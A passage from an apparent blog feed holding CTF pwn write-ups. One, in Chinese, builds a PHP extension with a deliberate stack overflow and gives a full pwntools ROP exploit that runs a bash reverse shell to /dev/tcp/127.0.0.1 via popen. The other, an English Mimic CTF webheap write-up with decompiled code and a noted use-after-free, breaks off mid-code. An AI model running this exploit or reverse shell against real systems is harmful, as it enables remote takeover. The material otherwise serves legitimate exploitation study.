class="comment"> * End:</span></span><br><span class="line"><span class="comment"> * vim600: noet sw=4 ts=4 fdm=marker</span></span><br><span class="line"><span class="comment"> * vim&lt;600: noet sw=4 ts=4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里我们主要看两个关键的部分，一个是用来写我们生成的主代码函数PHP_FUNCTION</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">RETURN_STR(strg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们主要的代码就是在 这里面进行写，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,arg,arg_len);</span><br><span class="line">php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们写完一个函数，然后需要注册下这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">PHP_FE(confirm_webpwn_compiled,<span class="literal">NULL</span>)<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">PHP_FE(webpwn,<span class="literal">NULL</span>)   <span class="comment">//在这里进行注册，然后注册个刚刚写的函数</span></span><br><span class="line">PHP_FE_END<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注册好以后，下一步直接make，进行make一下即可</p><p>make后，会在对应的目录下生成一个modules。这里面就是我们需要的扩展库</p><p>然后在我们的php.ini加载扩展库</p><p>查找php.ini方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name php.ini</span><br><span class="line">/etc/php/7.2/cli/php.ini</span><br><span class="line">在php.ini加载我们自己生成的拓展库</span><br><span class="line">extension=webpwn.so</span><br></pre></td></tr></table></figure><p>加载起来，下一步我们还要把对应的库放到我们本地对应的加载库里，如何找这个本地库的位置呢</p><p>我们先写个php文件让它运行php test.php | grep “webpwn” </p><p>然后报错：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;webpwn.so&#x27; (tried: /usr/lib/php/20170718/webpwn.so (/usr/lib/php/20170718/webpwn.so: cannot open shared object file: No such file or directory), /usr/lib/php/20170718/webpwn.so.so (/usr/lib/php/20170718/webpwn.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br></pre></td></tr></table></figure><p>可以看到对应的目录里没有我们生成的库&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;</p><p>那么我们就把自己生成的webpwn库放到这个文件夹里</p><p>然后再运行就不报错了</p><p>还有一点说的是</p><p>我们编写的php文件，然后用php运行其中原理是用我们加载的指定的生成库</p><p>那这样的话，我们就可以直接找到webpwn的思路了，直接去逆这个库，找到这个库的漏洞，是不是就能实现phppwn了，答案：是的</p><p>把webpwn.so放到ida里，找到对应的函数，zif_webpwn:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">zif_webpwn</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+80h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *arg; <span class="comment">// [rsp+88h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  arg = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;n) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, arg, n);</span><br><span class="line">    php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这个程序是有栈溢出的，memcpy对buf进行了溢出</p><p>然后下一步我们就开始写脚本进行触发这个栈溢出，注意点就是不能直接拿shell，需要反弹shell，这里采用popen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们只要找到对应的rdi和rsi传参即可，具体找法就是采用ROPbinary进行找寄存器，然后传参就可以了</p><p>这里知道了漏洞，我们直接开始写脚本(由于方便本地调试，这里我们关闭本地随机化，我是在Ubuntu20环境下打的，需要用到栈对齐)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chuangjian</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jsjsj.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php </span></span><br><span class="line"><span class="string">        webpwn(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">        ?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line">libc.address =<span class="number">0x7ffff763a000</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span>+libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span>+libc.address</span><br><span class="line">popen_addr = libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">cmd = <span class="string">&quot;/bin/bash -c \&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1\&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">stack_base = <span class="number">0x7ffffffde000</span></span><br><span class="line">stack_offset = <span class="number">0x1c330</span></span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">stack_addr = stack_offset+stack_base</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(ret)+p64(pop_rdi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x30</span>+<span class="number">0x60</span>+<span class="number">415</span>-<span class="number">23</span>)+p64(pop_rsi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x28</span>+<span class="number">384</span>+<span class="number">8</span>)\</span><br><span class="line">+p64(popen_addr)+ <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+popen_addr+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+cmd.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">chuangjian(payload)</span><br></pre></td></tr></table></figure><p>运行脚本生成php exp，然后gdb动调方法设置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb php   #动调php</span><br><span class="line">set args php_exp.php</span><br><span class="line">run  #加载到我们的webpwn库</span><br><span class="line">b zif_webpwn  #把断点下到我们写的漏洞文章</span><br><span class="line">run  #再run下就到我们的断点主函数了。进行动调就可以了</span><br></pre></td></tr></table></figure><p>遇到的🕳：</p><p>这个exp在调试中有很多曲折，呜呜呜，因为我犯了一个很低级的错误，就是ret栈对齐，栈对其之后，一直报segmentaton fault，然后动调了好久，发现自己s***了，光把ret填到前面了，后面 栈有些偏移和实际不符合导致rdi和rsi没传进去，然后细调了下就可以了，其实这个地方是个很低级的错误，没办法👴还是菜</p><h2 id="总结：通过本篇webpwn能入门php-web-pwn-知道了比赛中的web-pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题-是真有意思，经典名言：NO-PWN-Rev-NO-FUN！！！！"><a href="#总结：通过本篇webpwn能入门php-web-pwn-知道了比赛中的web-pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题-是真有意思，经典名言：NO-PWN-Rev-NO-FUN！！！！" class="headerlink" title="总结：通过本篇webpwn能入门php(web)pwn,知道了比赛中的web pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题 是真有意思，经典名言：NO PWN(Rev) NO FUN！！！！"></a>总结：通过本篇webpwn能入门php(web)pwn,知道了比赛中的web pwn是怎么做的一个流程，由于时间原因，有两道题没有叙述，这个会放到下一篇文章里，下篇文章估计会3天以后发，webpwn确实是一个令我感觉做pwn方向最有意思的pwn题，因为它是web和pwn相结合起来了，这个非常规pwn题 是真有意思，经典名言：NO PWN(Rev) NO FUN！！！！</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;非常规PWN-Web-pwn-一&quot;&gt;&lt;a href=&quot;#非常规PWN-Web-pwn-一&quot; class=&quot;headerlink&quot; title=&quot;非常规PWN&amp;amp;Web pwn(一)&quot;&gt;&lt;/a&gt;非常规PWN&amp;amp;Web pwn(一)&lt;/h1&gt;&lt;h3 id=</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022 Strong Network Mimic CTF PWN writeup</title>
    <link href="https://jsjsj.top/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/"/>
    <id>https://jsjsj.top/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/</id>
    <published>2022-10-03T14:12:28.000Z</published>
    <updated>2023-10-03T14:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-Strong-Network-Mimic-CTF-PWN-writeup"><a href="#2022-Strong-Network-Mimic-CTF-PWN-writeup" class="headerlink" title="2022 Strong Network Mimic CTF PWN writeup"></a>2022 Strong Network Mimic CTF PWN writeup</h1><p><strong>Foreword: It was too difficult. I didn’t sign up for the competition. My teammates sent two questions, webpwn. At first, it felt like an httpd question. In the end, it took a long time to find out that it was a VM http web heap question. It took a long time to debug the inverse parameters. I’m too naive. I feel that if these two questions are understood inversely, it will be easy to do. It is mainly about the inverse parameters. Reverse flow for this problem</strong></p><p>According to the normal reverse thinking, first general audit, find the main function, in the main function, find the logic of each function, find the logic of each function, and then expand to see</p><h2 id="webheap"><a href="#webheap" class="headerlink" title="webheap:"></a>webheap:</h2><p>The main functions of this question are as follows</p><ol><li>When receiving and sending packets, mainly complete the sending of packets, but this function does not do any conversion</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1999</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+17h] [rbp-29h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Packet length: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;stcd::<span class="built_in">cout</span>, <span class="string">&quot;The packet is too large&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::operator&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;buf);</span><br><span class="line">  <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(a1, v5, <span class="number">0LL</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    v2 = buf;</span><br><span class="line">    *(_BYTE *)<span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::operator[](a1, i) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>The second parameter is to accept and process the data sent, but the function here is very complicated, repeat the test and send, and then meet many conditions, it is recommended to combine dynamic debugging, because it is very complicated without dynamic debugging, I started There is no dynamic debugging, which leads to hard reading. The amount of code is very complicated. It is not recommended to hard reading. Here are the main functions to process data.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_44E7</span><span class="params">(__int64 a1, __int64 opcode, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+22h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v6; <span class="comment">// [rsp+23h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">4</span>]; <span class="comment">// [rsp+24h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  readOpcode1((__int64)v7, (<span class="built_in">std</span>::istream *)a3, &amp;v5);c</span><br><span class="line">  <span class="title function_">if</span> <span class="params">( (<span class="type">unsigned</span> __int8)sub_2468((__int64)v7) != <span class="number">1</span> )</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_2442(a1, (__int64)v7);</span><br><span class="line">  &#125;</span><br><span class="line">  elsec</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( sub_3415(v5) )                         <span class="comment">// v5为0xB9</span></span><br><span class="line">      sub_442A(a1, v6, opcode, a3);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      set_error(a1, <span class="number">1u</span>);                        </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_3415</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 == (<span class="type">char</span>)<span class="number">0xB9</span>;   Check that the byte of the first packet must be <span class="number">0xB9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_442A</span><span class="params">(__int64 a1, __int64 a2, __int64 opcode, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v7[<span class="number">4</span>]; <span class="comment">// [rsp+2Ch] [rbp-14h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v8[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v8[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  readOpcode2((__int64)v7, (__int64)v8, (<span class="built_in">std</span>::istream *)a4);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_2468((__int64)v7) != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2442(a1, (__int64)v7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v8[<span class="number">0</span>] == <span class="number">5</span> )c</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4397(a1, opcode, a4);   <span class="comment">//再次发送必须第二个数据要为5</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    set_error(a1, <span class="number">5u</span>);                         </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">chuanschuli</span><span class="params">(_DWORD *a1, <span class="type">unsigned</span> __int8 a2, _QWORD *a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x80</span>u:</span><br><span class="line">      sub_3427(a1, a3, a4);                     <span class="comment">// 1bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x81</span>:</span><br><span class="line">      sub_34D0(a1, a3, a4);                     <span class="comment">// 2bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x82</span>:</span><br><span class="line">      sub_357B(a1, a3, a4);                     <span class="comment">// 4bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x83</span>:</span><br><span class="line">      sub_3625(a1, a3, a4);                     <span class="comment">// 5bytes</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      *a3 = a2;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      no_error((__int64)a1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a1;  This is mainly to determine the data determined by the transmission parameters</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Probably the process has been reversed, and the next step is to combine gdb-pwndbg to carry out the next step. It is extremely complicated here, and debugging has been adjusted all morning.</p><p>After all the parameters are constructed, the next step is to directly find holes to play</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_18A3</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> op; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  op = *(_DWORD *)a1;</span><br><span class="line">  idx = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)a1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    show(idx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( op &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( op == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      del(idx);                                 <span class="comment">// uaf</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( op == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::basic_string(v4, a1 + <span class="number">24</span>);</span><br><span class="line">      edit(idx, (__int64)v4);</span><br><span class="line">      <span class="built_in">std</span>::__cxx11::basic_string&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;,<span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;&gt;::~basic_string(v4);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !op 